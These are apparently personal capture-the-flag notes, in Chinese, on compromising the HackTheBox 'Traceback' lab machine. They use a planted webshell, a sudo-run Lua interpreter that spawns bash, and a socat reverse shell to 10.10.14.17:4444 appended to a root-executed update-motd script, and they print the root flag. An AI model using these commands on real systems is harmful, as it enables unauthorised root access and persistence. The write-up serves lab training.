# HackTheBox-Traceback Notes

> victim: 10.10.10.181
>
> local: 10.10.14.17

## 信息搜集

### SYN端口扫描结果

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Webshell

通过提示信息找到了webshell地址`/smevk.php`，用户名/密码admin

通过Socat升级到完全交互式shell

.bash_history

```bash
ls -la
sudo -l # 发现 /home/sysadmin/luvit 不需要密码就可以sudo执行
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua #os.execute("/bin/bash") 直接提权
rm privesc.lua
logout
exit
ls
cd ~
ls
exit
```

note.txt

```
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

## Privilege Escalation

LinEnum没有找到合适的结果

在运行中的进程可以看到

```
/bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
```

发现`/etc/update-motd.d/`目录可写，且会利用root执行任务

利用这个可以提权

> Any code in that file will be run as the root account since the ssh-server service is run as root.

执行命令

```bash
echo "/var/www/html/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.17:4444" >> 00-header
```

Kali开始监听，victim退出重登，成功获取root shell

root.txt

```
82555710fefbfd8899f3117b9693badb
```

